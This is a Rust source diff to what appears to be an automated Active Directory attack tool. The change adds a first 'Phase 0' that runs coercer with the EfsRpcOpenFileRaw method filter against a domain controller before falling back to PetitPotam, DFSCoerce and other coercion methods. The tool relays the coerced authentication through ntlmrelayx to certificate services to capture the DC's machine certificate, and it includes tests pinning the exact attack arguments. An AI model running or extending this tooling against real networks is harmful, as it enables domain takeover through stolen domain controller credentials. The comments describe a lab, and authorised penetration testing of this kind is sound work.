@@ -875,6 +875,11 @@ struct RunOptions {
     poll_phase_1: Duration,
     poll_phase_2: Duration,
     poll_phase_3: Duration,
+    /// Cert-poll window for the new Phase 0 (`coercer --filter-method-name=
+    /// EfsRpcOpenFileRaw`). Matches phase 1 — coercer fires the RPC fast,
+    /// then the DC's auth + ntlmrelayx's adcs-attack writeback take a
+    /// handful of seconds.
+    poll_phase_0: Duration,
     post_capture_settle: Duration,
     relay_kill_timeout: Duration,
     keep_workdir_on_capture: bool,
@@ -914,6 +919,7 @@ impl RunOptions {
         Self {
             relay_settle: Duration::from_secs(3),
             poll_interval: Duration::from_millis(500),
+            poll_phase_0: Duration::from_secs(8),
             poll_phase_1: Duration::from_secs(8),
             poll_phase_2: Duration::from_secs(10),
             poll_phase_3: Duration::from_secs(8),
@@ -1361,30 +1367,67 @@ async fn run_relay_and_coerce<P: CoerceProcs>(
     let mut summary = format!("RELAY_PID={}\n", relay.pid());
     let mut captured_via: Option<&'static str> = None;
 
-    // Distros differ: Kali ships `petitpotam` (symlink), pip ships
-    // `impacket-petitpotam`. Try in order, log if both missing.
-    summary.push_str("=== unauth PetitPotam ===\n");
-    let petit_bin = ["petitpotam", "impacket-petitpotam"]
-        .into_iter()
-        .find(|b| procs.which_binary(b))
-        .unwrap_or("petitpotam");
-    // PetitPotam positional args are `target path` (where `target` is the
-    // machine being coerced and `path` is the UNC the target authenticates
-    // back to). Reversing them coerces the attacker host onto itself.
-    let unc_path = format!("\\\\{}\\share\\x", cfg.attacker_ip);
-    let p1_args: [&str; 2] = [cfg.coerce_target.as_str(), unc_path.as_str()];
+    // Phase 0: unauth `coercer --filter-method-name=EfsRpcOpenFileRaw`.
+    // Mirrors the operator's verified-working manual command against this
+    // lab's DCs. The protocol-name filter that Phase 3 uses walks every
+    // EFSR method and the patched ones often short-circuit the call before
+    // reaching the unpatched OpenFileRaw — surfacing as NO_AUTH_RECEIVED in
+    // the coerce log while ntlmrelayx times out with nothing relayed. The
+    // single-method filter sidesteps that and hits the path PetitPotam-
+    // style abuse actually uses.
+    summary.push_str("=== unauth coercer EfsRpcOpenFileRaw ===\n");
+    let p0_args: [&str; 9] = [
+        "coerce",
+        "-t",
+        cfg.coerce_target.as_str(),
+        "-l",
+        cfg.attacker_ip.as_str(),
+        "--filter-method-name",
+        "EfsRpcOpenFileRaw",
+        "--always-continue",
+        "--auth-type=smb",
+    ];
     procs
         .run_phase(
             &coerce_log,
-            "unauth PetitPotam",
-            petit_bin,
-            &p1_args,
+            "unauth coercer EfsRpcOpenFileRaw",
+            "coercer",
+            &p0_args,
             &workdir,
             COERCE_PHASE_TIMEOUT_SECS,
         )
         .await;
-    if poll_for_cert(&relay_log, opts.poll_phase_1, opts.poll_interval).await {
-        captured_via = Some("unauth_petitpotam");
+    if poll_for_cert(&relay_log, opts.poll_phase_0, opts.poll_interval).await {
+        captured_via = Some("unauth_coercer_EfsRpcOpenFileRaw");
+    }
+
+    // Phase 1: classic unauth PetitPotam — different code path from coercer.
+    // Distros differ: Kali ships `petitpotam` (symlink), pip ships
+    // `impacket-petitpotam`. Try in order, log if both missing.
+    if captured_via.is_none() {
+        summary.push_str("=== unauth PetitPotam ===\n");
+        let petit_bin = ["petitpotam", "impacket-petitpotam"]
+            .into_iter()
+            .find(|b| procs.which_binary(b))
+            .unwrap_or("petitpotam");
+        // PetitPotam positional args are `target path` (where `target` is the
+        // machine being coerced and `path` is the UNC the target authenticates
+        // back to). Reversing them coerces the attacker host onto itself.
+        let unc_path = format!("\\\\{}\\share\\x", cfg.attacker_ip);
+        let p1_args: [&str; 2] = [cfg.coerce_target.as_str(), unc_path.as_str()];
+        procs
+            .run_phase(
+                &coerce_log,
+                "unauth PetitPotam",
+                petit_bin,
+                &p1_args,
+                &workdir,
+                COERCE_PHASE_TIMEOUT_SECS,
+            )
+            .await;
+        if poll_for_cert(&relay_log, opts.poll_phase_1, opts.poll_interval).await {
+            captured_via = Some("unauth_petitpotam");
+        }
     }
 
     if captured_via.is_none() && cfg.coerce_user.is_some() {
@@ -2264,6 +2307,7 @@ mod tests {
         super::RunOptions {
             relay_settle: Duration::from_millis(0),
             poll_interval: Duration::from_millis(2),
+            poll_phase_0: Duration::from_millis(15),
             poll_phase_1: Duration::from_millis(15),
             poll_phase_2: Duration::from_millis(15),
             poll_phase_3: Duration::from_millis(15),
@@ -2312,6 +2356,7 @@ mod tests {
         }
     }
 
+    const PHASE0: &str = "unauth coercer EfsRpcOpenFileRaw";
     const PHASE1: &str = "unauth PetitPotam";
     const PHASE2: &str = "DFSCoerce";
     const PHASE3_FSRVP: &str = "coerce via MS-FSRVP (smb)";
@@ -2442,7 +2487,9 @@ mod tests {
         assert!(out.stdout.contains("RELAYED_USER=DC01$"));
         assert!(out.stdout.contains("PFX_FILE="));
         let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
-        assert_eq!(headers, vec![PHASE1]);
+        // Phase 0 runs first (and misses, since the fake isn't seeded for it),
+        // then Phase 1 captures and short-circuits remaining phases.
+        assert_eq!(headers, vec![PHASE0, PHASE1]);
     }
 
     #[tokio::test]
@@ -2454,7 +2501,8 @@ mod tests {
         assert!(!out.success);
         assert!(!out.stdout.contains("CERT_CAPTURED_VIA"));
         let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
-        assert_eq!(headers, vec![PHASE1]);
+        // Unauth path: Phase 0 + Phase 1 both miss; Phase 2/3 need creds.
+        assert_eq!(headers, vec![PHASE0, PHASE1]);
     }
 
     #[tokio::test]
@@ -2468,7 +2516,7 @@ mod tests {
         assert!(out.success);
         assert!(out.stdout.contains("CERT_CAPTURED_VIA=MS-DFSNM"));
         let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
-        assert_eq!(headers, vec![PHASE1, PHASE2]);
+        assert_eq!(headers, vec![PHASE0, PHASE1, PHASE2]);
     }
 
     #[tokio::test]
@@ -2486,6 +2534,7 @@ mod tests {
         assert_eq!(
             headers,
             vec![
+                PHASE0,
                 PHASE1,
                 PHASE2,
                 PHASE3_FSRVP,
@@ -2493,6 +2542,56 @@ mod tests {
                 PHASE3_EFSR,
                 PHASE3_RPRN
             ]
+        );
+    }
+
+    #[tokio::test]
+    async fn run_phase0_capture_skips_remaining_phases() {
+        // Phase 0 is the new verified-working unauth EfsRpcOpenFileRaw
+        // path. When it captures, no further phases should run — even
+        // when creds are supplied (which would otherwise unlock 2 and 3).
+        let log = b"[*] (SMB): Authenticating CONTOSO/DC01$@192.168.58.20 SUCCEED\n\
+                    [*] GOT CERTIFICATE! ID 1\n\
+                    [*] Writing PKCS#12 certificate to ./DC01.pfx\n";
+        let fake = FakeCoerceProcs::new().with_phase_pfx_drop(PHASE0, log, "DC01.pfx", b"\xfe\xed");
+        let out = super::run_relay_and_coerce(cfg_with_creds(), &fake, fast_opts())
+            .await
+            .unwrap();
+        assert!(out.success);
+        assert!(out
+            .stdout
+            .contains("CERT_CAPTURED_VIA=unauth_coercer_EfsRpcOpenFileRaw"));
+        let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
+        assert_eq!(headers, vec![PHASE0]);
+    }
+
+    #[tokio::test]
+    async fn run_phase0_invokes_coercer_with_efsrpc_method_filter() {
+        // Inspect Phase 0's argv to make sure we're invoking the verified-
+        // working method (--filter-method-name=EfsRpcOpenFileRaw) and not
+        // the protocol-name-scoped variant that walked patched methods and
+        // produced NO_AUTH_RECEIVED in production.
+        let fake = FakeCoerceProcs::new();
+        let _ = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
+            .await
+            .unwrap();
+        let calls = fake.calls();
+        let phase0 = calls
+            .iter()
+            .find(|c| c.header == PHASE0)
+            .expect("phase 0 should always run first");
+        assert_eq!(phase0.bin, "coercer");
+        let joined = phase0.args.join(" ");
+        assert!(
+            joined.contains("--filter-method-name EfsRpcOpenFileRaw"),
+            "phase 0 must use single-method filter, got: {joined}"
+        );
+        assert!(joined.contains("--always-continue"), "args: {joined}");
+        assert!(joined.contains("--auth-type=smb"), "args: {joined}");
+        // Listener IP must be the attacker IP from the config.
+        assert!(
+            joined.contains("-l 192.168.58.100"),
+            "expected listener flag with attacker IP, got: {joined}"
         );
     }
 
